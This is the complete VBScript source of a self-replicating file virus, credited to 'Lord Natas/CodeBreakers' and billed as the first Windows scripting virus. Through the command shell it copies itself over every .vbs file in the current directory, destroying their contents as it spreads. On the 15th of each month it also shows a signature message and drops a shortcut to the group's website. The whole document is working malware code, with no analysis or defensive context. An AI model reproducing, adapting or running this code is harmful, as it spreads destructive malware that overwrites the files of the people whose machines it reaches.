'VBSv Version 1.0 by Lord Natas/CodeBreakers
'First Windows Scripting Virus

Set WshShell = Wscript.CreateObject("Wscript.Shell")

CommandPath = WSHShell.ExpandEnvironmentStrings("%comspec%")

WshShell.Run (CommandPath & " /c for %%a in (*.vbs) do copy /y " & Wscript.ScriptFullName & " %%a >nul")

If Day(Now()) = 15 Then

WScript.Echo "VBSv v1.0" & Chr(13) & "by Lord Natas/CodeBreakers"

Set oUrlLink = WshShell.CreateShortcut("The CodeBreakers.URL")
oUrlLink.TargetPath = "http://www.codebreakers.org"
oUrlLink.Save

End If
